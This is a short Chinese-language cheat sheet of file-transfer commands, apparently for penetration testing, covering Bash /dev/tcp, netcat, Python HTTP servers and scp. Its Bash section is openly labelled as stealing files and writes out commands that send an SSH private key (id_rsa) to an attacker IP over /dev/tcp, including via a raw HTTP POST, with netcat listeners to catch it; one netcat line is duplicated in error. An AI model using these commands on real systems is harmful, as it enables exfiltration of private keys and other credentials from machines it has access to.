传输方法

传输方法常用命令

Bash上传

  • # 通过HTTP上传文件(需要在攻击者机器上运行HTTP服务)
  • bash -c 'echo -e "POST / HTTP/0.9 $(<id_rsa)" > /dev/tcp/10.10.164.167/1337'
  • # 通过TCP窃取文件# 用Netcat监听端口1337 +输出重定向
  • nc -l -p 1337 > data
  • bash -c 'cat id_rsa > /dev/tcp/10.10.164.167/1337'

Bash下载

  • # Send via netcat 通过netcat发送
  • nc -l -p 7777 < id_rsa
  • # 在另一台机器上下载文件
  • bash -c 'cat < /dev/tcp/127.0.0.1/7777 > id_rsa'

Netcat

  • #上传payload
  • nc -lnvp 7777
  • nc 127.0.0.1 7777 < id_rsa
  • # 下载
  • nc 127.0.0.1 7777 < id_rsa
  • nc -lnvp 7777 > file_saved

Python

  • # Python3 HTTP Server
  • python3 -m http.server 7777
  • # Python2 HTTP Server
  • python -m SimpleHTTPServer 7777

SCP

  • # 从本地主机上传到远程计算机
  • scp id_rsa username@127.0.0.1:~/destination -P 7777
  • # 从远程计算机下载
  • scp user@127.0.0.1:~/path_to_file file_saved -P 7777
